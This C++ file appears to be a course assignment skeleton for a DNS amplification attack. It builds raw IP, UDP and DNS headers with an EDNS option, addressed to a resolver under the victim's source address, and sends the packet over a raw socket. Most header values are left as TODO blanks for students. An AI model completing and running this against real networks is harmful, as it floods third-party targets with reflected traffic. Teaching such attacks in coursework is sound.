#include "dns_attack.h"

#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>

#include <cstring>
#include <iostream>
#include <span>
#include <string>
#include <vector>

int createDnsOption(std::span<uint8_t> buffer) {
  auto &&opt = *reinterpret_cast<DnsOption *>(buffer.data());
  // TODO: Please fill in the following blanks
  // opt.name = ;
  // opt.type = ;
  // opt.udplen = ;
  // opt.rcode = ;
  // opt.edns_ver = ;
  // opt.Z = ;
  // opt.datalen = ;
  return sizeof(DnsOption);
}

int createDnsQuery(std::span<uint8_t> buffer, const std::vector<uint8_t> &dnsRecord) {
  std::copy(dnsRecord.begin(), dnsRecord.end(), buffer.begin());

  auto queryBuffer = buffer.last(buffer.size() - dnsRecord.size());
  auto &&query = *reinterpret_cast<DnsQuery *>(queryBuffer.data());
  // TODO: Please fill in the following blanks
  // query.qclass = ;
  // query.qtype = ;

  auto nextBuffer = buffer.last(queryBuffer.size() - sizeof(DnsQuery));
  return createDnsOption(nextBuffer) + sizeof(DnsQuery) + dnsRecord.size();
}

int createDnsHeader(std::span<uint8_t> buffer, const std::vector<uint8_t> &dnsRecord) {
  auto &&hdr = *reinterpret_cast<DnsHeader *>(buffer.data());
  // TODO: Please fill in the following blanks
  // hdr.id = ;           // See project1 spec
  // hdr.flags = ;        // Flags
  // hdr.qcount = ;       // Questions
  // hdr.ans = ;          // Answer RRs
  // hdr.auth = ;         // Autority RRs
  // hdr.add = ;          // Additional RRs

  auto nextBuffer = buffer.last(buffer.size() - sizeof(DnsHeader));
  return createDnsQuery(nextBuffer, dnsRecord) + sizeof(DnsHeader);
}

int createUdpHeader(std::span<uint8_t> buffer, int targetPort,
                    const std::vector<uint8_t> &dnsRecord) {
  auto &&hdr = *reinterpret_cast<udphdr *>(buffer.data());
  // TODO: Please fill in the following blanks
  // hdr.source = ;
  // hdr.dest = ;

  auto nextBuffer = buffer.last(buffer.size() - sizeof(udphdr));
  int payloadLength = createDnsHeader(nextBuffer, dnsRecord) + sizeof(udphdr);

  // TODO: Please fill in the following blanks
  // hdr.len = ;
  // hdr.check = ;
  return payloadLength;
}

int createIpHeader(std::span<uint8_t> buffer, const std::string &targetIp, int targetPort,
                   const std::string &dnsIp, const std::vector<uint8_t> &dnsRecord) {
  auto &&hdr = *reinterpret_cast<iphdr *>(buffer.data());

  // TODO: Please fill in the following blanks
  // hdr.version = ;
  // hdr.ihl = ;
  // hdr.ttl = ;
  // hdr.protocol = ;
  // hdr.saddr = ;     // source IP address
  // hdr.daddr = ;     // destination IP address

  hdr.id = htons(getpid());
  hdr.frag_off = 0x40;  // Don't fragment

  auto nextBuffer = buffer.last(buffer.size() - sizeof(iphdr));
  int payloadLength = createUdpHeader(nextBuffer, targetPort, dnsRecord) + sizeof(iphdr);

  // TODO: Please fill in the following blanks
  // hdr.tot_len = ;
  // hdr.check = ;
  return payloadLength;
}

void attack(const std::string &targetIp, int targetPort, const std::string &dnsIp,
            char *dnsRecord) {
  // Make dns query
  std::vector<uint8_t> queryRecord;
  queryRecord.reserve(32);

  char *token = strtok(dnsRecord, ".");
  while (token != nullptr) {
    int len = strlen(token);
    queryRecord.emplace_back(len);
    queryRecord.insert(queryRecord.end(), token, token + len);
    token = strtok(nullptr, ".");
  }
  queryRecord.emplace_back(0);

  std::vector<uint8_t> packetBuffer(1024);
  int packetLength = createIpHeader(packetBuffer, targetIp, targetPort, dnsIp, queryRecord);
  // Send data
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  sockaddr_in addr{};
  addr.sin_family = AF_INET;
  addr.sin_port = htons(53);
  addr.sin_addr.s_addr = inet_addr(dnsIp.c_str());

  if (sock == -1) {
    std::cerr << "Could not create socket.\n";
  } else {
    sendto(sock, packetBuffer.data(), packetLength, 0, (sockaddr *)&addr, sizeof(addr));
    close(sock);
  }
}
